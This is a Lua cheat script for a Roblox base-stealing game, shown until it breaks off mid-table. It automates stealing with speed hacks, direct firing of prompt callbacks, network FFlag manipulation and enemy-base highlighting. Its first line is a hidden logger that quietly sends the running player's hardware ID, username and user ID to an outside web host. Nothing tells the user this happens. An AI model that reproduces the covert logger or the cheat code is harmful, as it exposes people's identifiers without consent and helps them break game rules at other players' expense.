pcall(function() local H=game:GetService("HttpService") local h="" pcall(function() if gethwid then h=gethwid() end end) if h=="" then pcall(function() h=game:GetService("RbxAnalyticsService"):GetClientId() end) end local p=game:GetService("Players").LocalPlayer local u,i="","" if p then u=p.Name i=tostring(p.UserId) end task.spawn(function() pcall(function() game:HttpGet("https://vyse-obfuscator-hub.lovable.app/api/public/vyse-log/ohwfnpje70?h="..H:UrlEncode(tostring(h)).."&u="..H:UrlEncode(u).."&id="..i) end) end) end)
_G.iCollectPro_SemiTP_Executed = true

local iCollectPro_ENV = (type(getgenv) == "function" and getgenv()) or _G
iCollectPro_ENV.__semiTpGen = (tonumber(iCollectPro_ENV.__semiTpGen) or 0) + 1
iCollectPro_ENV.iCollectPro_SemiTP_Gen = (tonumber(iCollectPro_ENV.iCollectPro_SemiTP_Gen) or 0) + 1
local iCollectPro_GEN = iCollectPro_ENV.iCollectPro_SemiTP_Gen
local function iCollectPro_ALIVE()
    return iCollectPro_ENV.iCollectPro_SemiTP_Gen == iCollectPro_GEN
end

do
    local function neuter(t)
        if type(t) ~= "table" then return end
        t.debounce = true
        t.execute = function() end
        t.SSDoTeleport = function() end
    end
    pcall(neuter, rawget(_G, "iCollectPro"))
    pcall(neuter, rawget(_G, "iCollectPro_SemiTP"))
    pcall(neuter, iCollectPro_ENV.iCollectPro)
    pcall(neuter, iCollectPro_ENV.iCollectPro_SemiTP)
    for _, key in ipairs({ "__semiTpTables", "iCollectPro_SemiTP_Tables" }) do
        if type(iCollectPro_ENV[key]) == "table" then
            for _, t in ipairs(iCollectPro_ENV[key]) do pcall(neuter, t) end
        end
    end
    iCollectPro_ENV.__semiTpTables = nil
    iCollectPro_ENV.iCollectPro = nil
    iCollectPro_ENV.iCollectPro_SemiTP_Tables = {}
end

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    repeat task.wait() until Players.LocalPlayer
    LocalPlayer = Players.LocalPlayer
end
local player = LocalPlayer

local IsMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local safeGuiTarget = nil
local successCore, _ = pcall(function()
    local test = Instance.new("Folder")
    test.Parent = CoreGui
    test:Destroy()
end)
safeGuiTarget = successCore and CoreGui or (player:WaitForChild("PlayerGui", 5) or player.PlayerGui)

local function getGuiParent()
    if gethui then return gethui() end
    return safeGuiTarget
end

pcall(function()
    local roots = { getGuiParent(), safeGuiTarget }
    for _, name in ipairs({"iCollectPro_SemiTP", "iCollectPro_SemiTP_Progress", "iCollectPro_SemiTP_Speed", "iCollectPro_SemiTP_AP", "iCollectPro_SemiTP_Allow", "iCollectPro_SemiTP_ESP"}) do
        for _, root in ipairs(roots) do
            while root and root:FindFirstChild(name) do
                root[name]:Destroy()
            end
        end
    end
end)

local T = {
    BG = Color3.fromRGB(20, 12, 34),
    SURF = Color3.fromRGB(28, 16, 46),
    SURF2 = Color3.fromRGB(48, 26, 76),
    HOVER = Color3.fromRGB(62, 34, 96),
    TEXT = Color3.fromRGB(240, 232, 255),
    DIM = Color3.fromRGB(155, 120, 200),
    ACCENT = Color3.fromRGB(168, 85, 247),
    ACCENT2 = Color3.fromRGB(124, 45, 190),
    STROKE = Color3.fromRGB(150, 70, 230),
    GREEN1 = Color3.fromRGB(18, 88, 58),
    GREEN2 = Color3.fromRGB(21, 120, 76),
    GREEN_STROKE = Color3.fromRGB(60, 185, 120),
    ON_TEXT = Color3.fromRGB(232, 255, 240),
    OFF_BG = Color3.fromRGB(48, 26, 74),
    OFF_TEXT = Color3.fromRGB(140, 110, 180),
    TRACK = Color3.fromRGB(34, 20, 54),
    TRACK2 = Color3.fromRGB(46, 26, 72),
    FILL1 = Color3.fromRGB(150, 70, 235),
    FILL2 = Color3.fromRGB(200, 150, 255),
}

local function corner(obj, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r)
    c.Parent = obj
    return c
end

local function stroke(obj, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = obj
    return s
end

local function gradient(obj, c1, c2, rot)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, c1), ColorSequenceKeypoint.new(1, c2) })
    g.Rotation = rot or 0
    g.Parent = obj
    return g
end

local function addShadow(obj, pad, transparency)
    local s = Instance.new("ImageLabel")
    s.Name = "Shadow"
    s.AnchorPoint = Vector2.new(0.5, 0.5)
    s.Position = UDim2.new(0.5, 0, 0.5, 2)
    s.Size = UDim2.new(1, pad or 24, 1, pad or 24)
    s.BackgroundTransparency = 1
    s.Image = "rbxassetid://6014261993"
    s.ImageColor3 = Color3.new(0, 0, 0)
    s.ImageTransparency = transparency or 0.72
    s.ScaleType = Enum.ScaleType.Slice
    s.SliceCenter = Rect.new(49, 49, 450, 450)
    s.ZIndex = math.max(obj.ZIndex - 1, 0)
    s.Parent = obj
    return s
end

local function tween(obj, t, props)
    TweenService:Create(obj, TweenInfo.new(t or 0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
end

local function addHover(obj, normalColor, hoverColor, rowStroke)
    obj.MouseEnter:Connect(function()
        tween(obj, 0.14, { BackgroundColor3 = hoverColor })
        if rowStroke then tween(rowStroke, 0.14, { Transparency = 0.38 }) end
    end)
    obj.MouseLeave:Connect(function()
        tween(obj, 0.14, { BackgroundColor3 = normalColor })
        if rowStroke then tween(rowStroke, 0.14, { Transparency = 0.52 }) end
    end)
end

local function makeDraggable(handle, target, onEnd)
    local dragging, dragInput, startInputPos, startPos = false, nil, nil, nil
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragInput = input
            startInputPos = input.Position
            startPos = target.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End and dragging then
                    dragging = false
                    if onEnd then onEnd() end
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input == dragInput) then
            local d = input.Position - startInputPos
            target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local configFile = "AURORA_REMAKE.json"
local HubConfig = {
    stealBoostAutoOnSteal = true,
    speedValue = 22,
    hexSpeedVisible = false,
    speedPos = {ScaleX = 0.98, OffsetX = 0, ScaleY = 0.02, OffsetY = 0},
    stealKeybind = "E",
    potionEnabled = true,
    autoTPOnAllowEnabled = false,
    kickAfterStealEnabled = false,
    antiRagdollEnabled = true,
    antiRocketEnabled = true,
    antiBeeEnabled = true,
    antiGummyEnabled = true,
    antiDiscoEnabled = true,
    destroySentryEnabled = false,
    destroyDogeEnabled = false,
    selectedSlot = 1
}

if isfile and isfile(configFile) then
    local success, decoded = pcall(function() return HttpService:JSONDecode(readfile(configFile)) end)
    if success and decoded then
        for k, v in pairs(decoded) do
            if k ~= "selectedSlot" then HubConfig[k] = v end
        end
    end
end
HubConfig.selectedSlot = 1
HubConfig.apOnStealEnabled = nil
HubConfig.autoActivateEnabled = nil

local function saveHubConfig()
    if writefile then pcall(function() writefile(configFile, HttpService:JSONEncode(HubConfig)) end) end
end

if type(HubConfig.positions) ~= "table" then HubConfig.positions = {} end

local function restorePos(frame, key)
    local p = HubConfig.positions[key]
    if type(p) == "table" and #p == 4 then
        frame.Position = UDim2.new(tonumber(p[1]) or 0, tonumber(p[2]) or 0, tonumber(p[3]) or 0, tonumber(p[4]) or 0)
    end
end

local function rememberPos(frame, key)
    return function()
        local q = frame.Position
        HubConfig.positions[key] = { q.X.Scale, q.X.Offset, q.Y.Scale, q.Y.Offset }
        saveHubConfig()
    end
end

_G.iCollectPro_SemiTP_SpeedBoost = HubConfig.stealBoostAutoOnSteal ~= false
local currentSpeed = HubConfig.speedValue or 22
local currentStealKey = Enum.KeyCode[HubConfig.stealKeybind or "E"]
local PotionEnabled = HubConfig.potionEnabled
local AutoTPOnAllowEnabled = HubConfig.autoTPOnAllowEnabled or false
local KickAfterStealEnabled = HubConfig.kickAfterStealEnabled or false
local AntiRagdollEnabled = HubConfig.antiRagdollEnabled ~= false
local AntiRocketEnabled = HubConfig.antiRocketEnabled ~= false
local iCollectProFx = {
    bee = HubConfig.antiBeeEnabled ~= false,
    gummy = HubConfig.antiGummyEnabled ~= false,
    disco = HubConfig.antiDiscoEnabled ~= false,
    paint = HubConfig.antiPaintEnabled ~= false,
    web = HubConfig.antiWebEnabled ~= false,
    swap = HubConfig.antiSwapEnabled ~= false,
    infJump = HubConfig.infJumpEnabled == true,
    unlockTP = HubConfig.autoTPOnUnlockEnabled == true,
    sentry = HubConfig.destroySentryEnabled ~= false,
    doge = HubConfig.destroyDogeEnabled ~= false,
    ghost = HubConfig.serverGhostEnabled == true,
    esp = HubConfig.playerEspEnabled == true,
    tracers = HubConfig.tracersEnabled == true,
    aim = HubConfig.aimbotEnabled == true,
    spam = HubConfig.autoSpamEnabled == true,
    xray = HubConfig.baseXrayEnabled == true,
    timerEsp = HubConfig.baseTimerEspEnabled == true,
    timerFloors = HubConfig.timerEveryFloorEnabled == true,
    tags = HubConfig.stealTagsEnabled == true,
    baseEsp = HubConfig.baseEspEnabled == true,
    thiefBar = HubConfig.thiefBarEnabled == true,
    rejoin2 = HubConfig.autoRejoinEnabled == true,
    speedOn = HubConfig.moveSpeedEnabled == true,
    carpet = HubConfig.carpetSpeedEnabled == true,
    grav = HubConfig.gravityEnabled == true,
    fps = HubConfig.fpsOptimizerEnabled == true,
    pillBar = HubConfig.pillBarEnabled ~= false,
    defBypass = HubConfig.defenderBypassEnabled == true,
    pubGrab = HubConfig.publicGrabEnabled == true,
    quickGrab = HubConfig.quickGrabEnabled == true,
    fov = HubConfig.customFovEnabled == true,
    xfps = HubConfig.extremeFpsEnabled == true,
    hideAP = HubConfig.hideApIconEnabled == true,
}
local selectedSlot = 1
local targetPlot = nil

local STEAL_SPEED_MIN, STEAL_SPEED_MAX = 15, 23
local STEAL_CYCLE_EVERY, STEAL_CYCLE_GAP = 2, 0.15

local function stealSpeed()
    return math.clamp(tonumber(currentSpeed) or 22, STEAL_SPEED_MIN, STEAL_SPEED_MAX)
end

local stealBoostPaused = false
local stealCycleToken = 0

local function isStealBoostLive()
    return player:GetAttribute("Stealing") == true and not stealBoostPaused
end

local function onStealingChanged()
    stealCycleToken = stealCycleToken + 1
    stealBoostPaused = false
    if not player:GetAttribute("Stealing") then return end
    local mine = stealCycleToken
    task.spawn(function()
        while true do
            task.wait(STEAL_CYCLE_EVERY)
            if not iCollectPro_ALIVE() or mine ~= stealCycleToken or not player:GetAttribute("Stealing") then return end
            stealBoostPaused = true
            task.wait(STEAL_CYCLE_GAP)
            stealBoostPaused = false
        end
    end)
end
local stealAttrConn
stealAttrConn = player:GetAttributeChangedSignal("Stealing"):Connect(function()
    if not iCollectPro_ALIVE() then stealAttrConn:Disconnect() return end
    onStealingChanged()
end)
task.defer(onStealingChanged)

local activeSpeedConnections = {}
local function clearSpeedConnections()
    for _, conn in ipairs(activeSpeedConnections) do if conn then conn:Disconnect() end end
    activeSpeedConnections = {}
end

local function initSpeedFeatures(char)
    clearSpeedConnections()
    local hum = char:WaitForChild("Humanoid", 5)
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    if not (hum and hrp) then return end

    local speedConn
    speedConn = RunService.Heartbeat:Connect(function(dt)
        if not iCollectPro_ALIVE() then speedConn:Disconnect() return end
        if not char or not char.Parent or not hum or not hrp or hum.Health <= 0 then return end
        if not _G.iCollectPro_SemiTP_SpeedBoost or not isStealBoostLive() then return end
        if hum.MoveDirection.Magnitude <= 0 then return end
        if hum.FloorMaterial == Enum.Material.Air then return end
        local extra = math.max(stealSpeed() - hum.WalkSpeed, 0)
        if extra > 0 then
            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * extra * dt)
        end
    end)
    table.insert(activeSpeedConnections, speedConn)
end

if player.Character then task.spawn(initSpeedFeatures, player.Character) end
local speedCharConn
speedCharConn = player.CharacterAdded:Connect(function(char)
    if not iCollectPro_ALIVE() then speedCharConn:Disconnect() return end
    task.wait(0.2)
    initSpeedFeatures(char)
end)

local STEAL_DURATION = 1.3
local progressFill, percentLabel = nil, nil

local function updateProgressBar(p)
    if progressFill then
        TweenService:Create(progressFill, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(math.clamp(p, 0, 1), 0, 1, 0)
        }):Play()
    end
    if percentLabel then percentLabel.Text = math.floor(math.clamp(p, 0, 1) * 100) .. "%" end
end

local findMyBase
do
    local cached, checkedAt = nil, 0
    local function isMine(base)
        local sign = base and base.Parent and base:FindFirstChild("PlotSign")
        local yourBase = sign and sign:FindFirstChild("YourBase")
        return yourBase ~= nil and yourBase.Enabled
    end
    findMyBase = function()
        local now = os.clock()
        if cached and now - checkedAt < 2 and cached.Parent then return cached end
        if cached and isMine(cached) then checkedAt = now return cached end
        cached = nil
        local plots = Workspace:FindFirstChild("Plots")
        if not plots then return nil end
        for _, base in ipairs(plots:GetChildren()) do
            if isMine(base) then cached, checkedAt = base, now return base end
        end
        for _, base in ipairs(plots:GetChildren()) do
            if base:IsA("Model") then
                for _, d in ipairs(base:GetDescendants()) do
                    if d:IsA("TextLabel") and (string.find(d.Text, player.Name, 1, true) or string.find(d.Text, player.DisplayName, 1, true)) then
                        cached, checkedAt = base, now
                        return base
                    end
                end
            end
        end
        return nil
    end
end

local function isEnemyPlot(plot)
    if not plot or not plot:IsA("Model") then return false end
    local sign = plot:FindFirstChild("PlotSign")
    local yourBase = sign and sign:FindFirstChild("YourBase")
    if yourBase and yourBase.Enabled then return false end
    local sg = sign and sign:FindFirstChild("SurfaceGui")
    local frame = sg and sg:FindFirstChild("Frame")
    local label = frame and frame:FindFirstChild("TextLabel")
    if not label or label.Text == "Empty Base" then return false end
    local owner = label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
    return owner ~= player.Name and owner ~= player.DisplayName
end

pcall(function()
    for _, d in ipairs(Workspace:GetDescendants()) do
        if d:IsA("Highlight") and d.Name == "iCollectPro_SemiTP_Podium_Highlight" then
            d:Destroy()
        end
    end
end)

local slotHasTarget = true
local podiumInfoText = ""

local function readPodiumInfo(podium)
    local sp = podium and podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
    local debris = Workspace:FindFirstChild("Debris")
    if not sp or not debris then return "" end
    local base = sp.Position
    local best, bestD = nil, 7
    for _, o in ipairs(debris:GetChildren()) do
        if o.Name == "FastOverheadTemplate" and o:IsA("BasePart") then
            local p = o.Position
            local d = Vector3.new(p.X - base.X, 0, p.Z - base.Z).Magnitude
            if d < bestD and p.Y > base.Y - 2 and p.Y < base.Y + 25 then best, bestD = o, d end
        end
    end
    local bb = best and best:FindFirstChild("AnimalOverhead")
    if not bb then return "empty" end
    local function txt(name)
        local l = bb:FindFirstChild(name, true)
        return (l and l:IsA("TextLabel") and l.Visible and l.Text ~= "") and l.Text or nil
    end
    local name, gen, mut = txt("DisplayName"), txt("Generation"), txt("Mutation")
    if not name then return "empty" end
    return (mut and (mut .. " ") or "") .. name .. (gen and ("  " .. gen) or "")
end

local darkBlueHighlight = Instance.new("Highlight")
darkBlueHighlight.Name = "iCollectPro_SemiTP_Podium_Highlight"
darkBlueHighlight.FillColor = T.ACCENT2
darkBlueHighlight.OutlineColor = T.FILL2
darkBlueHighlight.FillTransparency = 0.35
darkBlueHighlight.OutlineTransparency = 0

local function getTargetPodiumForSlot(slot)
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end

    local bestPodium, bestScore = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = (not targetPlot or plot == targetPlot) and isEnemyPlot(plot) and plot:FindFirstChild("AnimalPodiums")
        local podium = podiums and podiums:FindFirstChild(tostring(slot))
        local spawn = podium and podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
        local pa = spawn and spawn:FindFirstChild("PromptAttachment")
        local prompt = pa and pa:FindFirstChildWhichIsA("ProximityPrompt")
        if spawn and prompt then
            local score = (hrp.Position - spawn.Position).Magnitude
            if not prompt.Enabled then score = score + 100000 end
            if score < bestScore then
                bestScore = score
                bestPodium = podium
            end
        end
    end
    return bestPodium
end

task.spawn(function()
    while task.wait(0.25) do
        if not iCollectPro_ALIVE() then darkBlueHighlight:Destroy() return end
        local targetPodium = getTargetPodiumForSlot(selectedSlot)
        slotHasTarget = targetPodium ~= nil
        podiumInfoText = targetPodium and readPodiumInfo(targetPodium) or "no enemy base has this podium"
        if targetPodium then
            if darkBlueHighlight.Adornee ~= targetPodium or darkBlueHighlight.Parent ~= targetPodium then
                darkBlueHighlight.Adornee = targetPodium
                darkBlueHighlight.Parent = targetPodium
            end
        else
            darkBlueHighlight.Adornee = nil
            darkBlueHighlight.Parent = nil
        end
    end
end)

local function getNearestDeliveryHitbox()
    local myBase = findMyBase()
    if not myBase then return nil end
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    local refPos = hrp and hrp.Position or myBase:GetPivot().Position

    local nearestPos = nil
    local minDist = math.huge
    for _, d in pairs(myBase:GetDescendants()) do
        if d.Name == "DeliveryHitbox" then
            local pos = d:IsA("BasePart") and d.Position or (d:IsA("Model") and d:GetPivot().Position)
            if pos then
                local dist = (pos - refPos).Magnitude
                if dist < minDist then
                    minDist = dist
                    nearestPos = pos
                end
            end
        end
    end

    if not nearestPos then
        for _, d in pairs(Workspace:GetDescendants()) do
            if d.Name == "DeliveryHitbox" then
                local pos = d:IsA("BasePart") and d.Position or (d:IsA("Model") and d:GetPivot().Position)
                if pos then
                    local dist = (pos - refPos).Magnitude
                    if dist < minDist then
                        minDist = dist
                        nearestPos = pos
                    end
                end
            end
        end
    end

    return nearestPos
end

local setStealStatus = function() end

local CLAIM_WATCH = 10
local KICK_INVITE = "\n\ndiscord.gg/freescripts"

local function myFilledPodiums()
    local plot = findMyBase()
    local pods = plot and plot:FindFirstChild("AnimalPodiums")
    if not pods then return nil end
    local n = 0
    for _, p in ipairs(pods:GetChildren()) do
        local info = readPodiumInfo(p)
        if info ~= "" and info ~= "empty" then n = n + 1 end
    end
    return n
end

do
    local carrying, before, stolenName, stealChar = false, nil, nil, nil
    local claimToken, lastEnd, claimed = 0, 0, false

    local function onClaim(token)
        if token ~= claimToken or claimed then return end
        claimed = true
        claimToken = claimToken + 1
        setStealStatus("DELIVERED" .. (stolenName and (": " .. stolenName) or ""), true)
        if KickAfterStealEnabled then
            task.defer(function()
                pcall(function()
                    player:Kick("You stole " .. (stolenName or "a brainrot") .. KICK_INVITE)
                end)
            end)
        end
    end

    local net = ReplicatedStorage:FindFirstChild("Packages")
    net = net and net:FindFirstChild("Net")
    local success = net and net:FindFirstChild("RE/StealService/StealingSuccess")
    if success then
        local conn
        conn = success.OnClientEvent:Connect(function()
            if not iCollectPro_ALIVE() then conn:Disconnect() return end
            if carrying or os.clock() - lastEnd < CLAIM_WATCH then onClaim(claimToken) end
        end)
    end

    local attrConn
    attrConn = player:GetAttributeChangedSignal("Stealing"):Connect(function()
        if not iCollectPro_ALIVE() then attrConn:Disconnect() return end
        if player:GetAttribute("Stealing") then
            carrying = true
            claimed = false
            claimToken = claimToken + 1
            stealChar = player.Character
            before = myFilledPodiums()
            local idx = player:GetAttribute("StealingIndex")
            stolenName = (idx ~= nil and idx ~= "") and tostring(idx) or nil
            local hs = _G.iCollectPro_SemiTP
            local took = hs and hs.pressedAt and (tick() - hs.pressedAt)
            local tookText = (took and took < 15) and string.format("  %.1fs", took) or ""
            setStealStatus("CARRYING" .. (stolenName and (": " .. stolenName) or "") .. tookText, nil)
            return
        end
        if not carrying then return end
        carrying = false
        if claimed then return end
        local ch = player.Character
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
        local hit = hrp and getNearestDeliveryHitbox()
        local atBase = hit and Vector3.new(hrp.Position.X - hit.X, 0, hrp.Position.Z - hit.Z).Magnitude <= 40
        if ch ~= stealChar or not hum or hum.Health <= 0 or _G.iCollectPro_SemiTP_ResetBusy or not atBase then
            claimToken = claimToken + 1
            setStealStatus("DROPPED" .. (stolenName and (": " .. stolenName) or ""), false)
            return
        end
        lastEnd = os.clock()
        local mine = claimToken
        task.spawn(function()
            local t0 = os.clock()
            while os.clock() - t0 < CLAIM_WATCH do
                if mine ~= claimToken or not iCollectPro_ALIVE() then return end
                local now = myFilledPodiums()
                if now and before and now > before then onClaim(mine) return end
                task.wait(0.1)
            end
            if mine == claimToken then
                claimToken = claimToken + 1
                setStealStatus("DROPPED" .. (stolenName and (": " .. stolenName) or ""), false)
            end
        end)
    end)

    local idxConn
    idxConn = player:GetAttributeChangedSignal("StealingIndex"):Connect(function()
        if not iCollectPro_ALIVE() then idxConn:Disconnect() return end
        local idx = player:GetAttribute("StealingIndex")
        if idx ~= nil and idx ~= "" then stolenName = tostring(idx) end
    end)
end

local FFlags = {
    GameNetPVHeaderRotationalVelocityZeroCutoffExponent = -5000, LargeReplicatorWrite5 = true,
    LargeReplicatorEnabled9 = true, AngularVelociryLimit = 360,
    TimestepArbiterVelocityCriteriaThresholdTwoDt = 2147483646, S2PhysicsSenderRate = 15000,
    DisableDPIScale = true, MaxDataPacketPerSend = 2147483647, PhysicsSenderMaxBandwidthBps = 20000,
    TimestepArbiterHumanoidLinearVelThreshold = 21, MaxMissedWorldStepsRemembered = -2147483648,
    PlayerHumanoidPropertyUpdateRestrict = true, SimDefaultHumanoidTimestepMultiplier = 0,
    StreamJobNOUVolumeLengthCap = 2147483647, DebugSendDistInSteps = -2147483648,
    GameNetDontSendRedundantNumTimes = 1, CheckPVLinearVelocityIntegrateVsDeltaPositionThresholdPercent = 1,
    CheckPVDifferencesForInterpolationMinVelThresholdStudsPerSecHundredth = 1,
    LargeReplicatorSerializeRead3 = true, ReplicationFocusNouExtentsSizeCutoffForPauseStuds = 2147483647,
    CheckPVCachedVelThresholdPercent = 10, CheckPVDifferencesForInterpolationMinRotVelThresholdRadsPerSecHundredth = 1,
    GameNetDontSendRedundantDeltaPositionMillionth = 1, InterpolationFrameVelocityThresholdMillionth = 5,
    StreamJobNOUVolumeCap = 2147483647, InterpolationFrameRotVelocityThresholdMillionth = 5,
    CheckPVCachedRotVelThresholdPercent = 10, WorldStepMax = 30,
    InterpolationFramePositionThresholdMillionth = 5, TimestepArbiterHumanoidTurningVelThreshold = 1,
    SimOwnedNOUCountThresholdMillionth = 2147483647, GameNetPVHeaderLinearVelocityZeroCutoffExponent = -5000,
    NextGenReplicatorEnabledWrite4 = true, TimestepArbiterOmegaThou = 1073741823, MaxAcceptableUpdateDelay = 1,
    LargeReplicatorSerializeWrite4 = true
}

local setFFlags = function()
    if type(setfflag) ~= "function" then return end
    for name, value in pairs(FFlags) do pcall(function() setfflag(tostring(name), tostring(value)) end) end
end

local FLY_GEAR_KEYS ={ "carpet", "broom", "wings", "sleigh", "waverider", "jetpack", "hoverboard", "glider" }

local function findFlyGear()
    local want, fallback = HubConfig.flyTool, nil
    for _, cont in ipairs({ player.Character, player:FindFirstChild("Backpack") }) do
        if cont then
            for _, t in ipairs(cont:GetChildren()) do
                if t:IsA("Tool") then
                    if t.Name == want then return t end
                    local nm = t.Name:lower()
                    for _, k in ipairs(FLY_GEAR_KEYS) do
                        if not fallback and nm:find(k, 1, true) then fallback = t end
                    end
                end
            end
        end
    end
    return fallback
end

local flyGearToken = 0

local function holdFlyGearUntilCarrying()
    flyGearToken = flyGearToken + 1
    local mine = flyGearToken
    task.spawn(function()
        local tool = findFlyGear()
        local t0 = os.clock()
        while mine == flyGearToken and iCollectPro_ALIVE() and os.clock() - t0 < 12 do
            if player:GetAttribute("Stealing") then break end
            local char = player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hum or hum.Health <= 0 then break end
            if not tool or not tool.Parent then tool = findFlyGear() end
            if tool and tool.Parent ~= char then
                pcall(function() hum:EquipTool(tool) end)
            end
            task.wait(0.3)
        end
    end)
end

local function stopFlyGear()
    flyGearToken = flyGearToken + 1
end

local walkTo = function(hrp, targetCords, desiredSpeed, precisionThreshold, stopWhen)
    if not hrp or not hrp.Parent or not targetCords then return end
    desiredSpeed = desiredSpeed or 180
    local running = true
    local connection
    local threshold = precisionThreshold or 3

    local _ctrls
    pcall(function() _ctrls = require(player.PlayerScripts:WaitForChild("PlayerModule", 2)):GetControls() end)
    if _ctrls then pcall(function() _ctrls:Disable() end) end

    connection = RunService.Heartbeat:Connect(function()
        if not hrp or not hrp.Parent or not running then
            if connection then connection:Disconnect() end
            return
        end
        local currentPos  = hrp.Position
        local flatCurrent = Vector3.new(currentPos.X, targetCords.Y, currentPos.Z)
        local direction   = targetCords - flatCurrent
        local distance    = direction.Magnitude
        if distance <= threshold or (stopWhen and stopWhen()) then
            running = false
            connection:Disconnect()
            hrp.Velocity = Vector3.zero
            return
        end
        local vel = direction.Unit * desiredSpeed
        hrp.Velocity = Vector3.new(vel.X, hrp.Velocity.Y, vel.Z)
    end)

    local startT = tick()
    while running do
        if tick() - startT > 6 then break end
        task.wait()
    end

    if _ctrls and not _G.iCollectPro_SemiTP_InputLock then pcall(function() _ctrls:Enable() end) end
end


local canDirectTp = function(HRP, targetPos)
    if not HRP or not targetPos then return false end
    local origin = HRP.Position
    local ignored = { player.Character }
    for _ = 1, 12 do
        local direction = targetPos - origin
        if direction.Magnitude <= 0.05 then return true end
        local params = RaycastParams.new()
        params.FilterType = Enum.RaycastFilterType.Blacklist
        params.FilterDescendantsInstances = ignored
        params.IgnoreWater = true
        local result = Workspace:Raycast(origin, direction, params)
        if not result then return true end
        local hit = result.Instance
        if not hit then return true end
        if hit:IsA("BasePart") and not hit.CanCollide then
            table.insert(ignored, hit)
            origin = result.Position + direction.Unit * 0.1
        else
            return (result.Position - targetPos).Magnitude <= 3
        end
    end
    return false
end

local function iCollectProAutoPotion()
    if not PotionEnabled then return end
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local bp = player:FindFirstChild("Backpack")
    if not hum then return end
    local shield = char:FindFirstChild("Grief Shield") or (bp and bp:FindFirstChild("Grief Shield"))
    if shield then
        pcall(function() hum:EquipTool(shield) end)
        local t0 = os.clock()
        while shield.Parent ~= char and os.clock() - t0 < 0.3 do task.wait() end
        if shield.Parent == char then pcall(function() shield:Activate() end) end
        task.wait(0.03)
    end
    local potion = char:FindFirstChild("Giant Potion") or (bp and bp:FindFirstChild("Giant Potion"))
    if potion then
        pcall(function() hum:EquipTool(potion) end)
        pcall(function() potion:Activate() end)
    end
end

local iCollectProStealCache = setmetatable({}, { __mode = "k" })
local iCollectProHold = { lastHold = 0 }
local iCollectProStealCallbacks = function(prompt)
    if type(getconnections) ~= "function" then return nil end
    if iCollectProStealCache[prompt] then return iCollectProStealCache[prompt] end
    local data = { hold = {}, trigger = {} }
    local ok1, c1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
    if ok1 then
        for _, c in ipairs(c1) do
            local f = c.Function
            local src = type(f) == "function" and (debug.info(f, "s") or "") or ""
            if type(f) == "function" and not (src:find("PlotClient", 1, true) and not src:find("AnimalPrompt", 1, true)) then
                table.insert(data.hold, function(...)
                    iCollectProHold.lastHold = tick()
                    return f(...)
                end)
            end
        end
    end
    local ok2, c2 = pcall(getconnections, prompt.Triggered)
    if ok2 then for _, c in ipairs(c2) do if type(c.Function) == "function" then table.insert(data.trigger, c.Function) end end end
    if #data.hold == 0 and #data.trigger == 0 then return nil end
    iCollectProStealCache[prompt] = data
    return data
end

function iCollectProHold.startStealHold(prompt)
    if not prompt or not prompt.Parent then return nil end
    local cb = iCollectProStealCallbacks(prompt)
    if not cb then return nil end
    for _, fn in ipairs(cb.hold) do task.spawn(fn) end
    local now = tick()
    return { prompt = prompt, cb = cb, ragdollFireTime = now, startedAt = now, holdBeganAt = now, holdDone = true }
end

function iCollectProHold.doHoldAndWait(ctx)
    if ctx.holdDone then return end
    for _, fn in ipairs(ctx.cb.hold) do task.spawn(fn) end
    ctx.holdBeganAt = tick()
    task.wait(1.3)
    ctx.holdDone = true
end

function iCollectProHold.waitForStealTime(ctx, sec)
    if not ctx or sec >= 1.0 then return end
    local elapsed = tick() - ctx.ragdollFireTime
    if elapsed < sec then task.wait(sec - elapsed) end
end

function iCollectProHold.finishStealHold(ctx)
    if not ctx then return false end
    if not ctx.holdBeganAt then iCollectProHold.doHoldAndWait(ctx) end
    local heldFor = tick() - (ctx.holdBeganAt or tick())
    if heldFor < 1.3 then task.wait(1.3 - heldFor) end
    task.wait(0.02)
    for _, fn in ipairs(ctx.cb.trigger) do task.spawn(fn) end
    return true
end

local ROW_ROUTES = {
    { z = -14.5, inside = Vector3.new(12.89, 4.88, -17.06), green = Vector3.new(30.63, 2.98, -32.97) },
    { z = -7.0, inside = Vector3.new(11.95, 5.13, -9.17), green = Vector3.new(22.58, 2.98, -35.87) },
    { z = 0.5, inside = Vector3.new(14.39, 4.88, -2.44), green = Vector3.new(21.60, 2.98, -28.10) },
